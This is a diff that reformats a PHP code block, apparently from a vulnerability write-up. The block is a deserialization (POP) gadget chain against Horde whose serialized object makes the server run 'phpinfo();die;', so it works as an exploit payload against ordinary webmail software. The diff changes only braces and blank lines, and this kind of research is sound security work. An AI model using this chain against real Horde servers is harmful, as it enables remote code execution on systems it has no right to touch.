@@ -778,12 +778,13 @@ Here is the completed POP chain I used:
 ```php
 <?php
 
-class Horde_Config{
+class Horde_Config
+{
    protected $_oldConfig = "phpinfo();die;";
 }
 
-class Horde_Prefs_Scope implements Serializable{
-
+class Horde_Prefs_Scope implements Serializable
+{
     protected $_prefs = array(1);
     protected $scope;
 
@@ -799,11 +800,12 @@ class Horde_Prefs_Scope implements Serializable{
     {
         list($this->scope, $this->_prefs) = json_decode($data, true);
     }
-
 }
 
-class Horde_Prefs{
+class Horde_Prefs
+{
    protected $_opts, $_scopes;
+
    function __construct()
    {
       $this->_opts['sizecallback'] = array(new Horde_Config, 'readXMLConfig');
@@ -811,7 +813,9 @@ class Horde_Prefs{
    }
 }
 
-class Horde_Prefs_Identity{
+class Horde_Prefs_Identity
+{
+
    protected $_prefs, $_prefnames, $_identities;
    function __construct()
    {
@@ -819,7 +823,6 @@ class Horde_Prefs_Identity{
       $this->_prefs = new Horde_Prefs;
       $this->_prefnames['identities'] = 0;
    }
-
 }
 
 class Horde_Kolab_Server_Decorator_Clean
@@ -830,7 +833,6 @@ class Horde_Kolab_Server_Decorator_Clean
       $this->_added = array(0);
       $this->_server = new Horde_Prefs_Identity;
    }
-
 }
 
 $popchain = serialize(new Horde_Kolab_Server_Decorator_Clean);
